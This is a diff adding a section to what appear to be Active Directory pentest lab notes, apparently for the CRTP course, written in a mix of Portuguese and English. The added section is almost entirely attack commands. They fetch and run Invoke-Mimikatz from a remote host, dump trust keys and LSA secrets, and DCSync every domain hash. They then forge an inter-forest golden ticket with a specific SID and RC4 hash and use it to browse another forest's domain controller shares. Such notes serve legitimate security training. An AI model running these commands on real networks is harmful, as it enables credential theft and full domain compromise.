@@ -3207,3 +3207,21 @@ powercat -l -p 666 -v
 ```
 ##### MIMIKATZ - TRUST ACROSS FOREST BOUNDARY (DOMINIOS EXTERNOS)
 With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest.
+COMO DOMAIN ADMIN:
+```
+IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/crtp/Invoke-Mimikatz.ps1")
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /domain:dollarcorp.moneycorp.local /all /csv"'
+```
+	
+NA MINHA MAQUINA:
+```
+Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:2312dc4f4fdd49029d2945ee1b2b3c2c /service:krbtgt /target:eurocorp.local /ticket:C:\trust_forest_tkt.kirbi"'
+.\asktgs.exe C:\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
+.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local 
+```
+```
+ls \\eurocorp-dc.eurocorp.local\c$
+ls \\eurocorp-dc.eurocorp.local\Sharedwithdcorp
+```
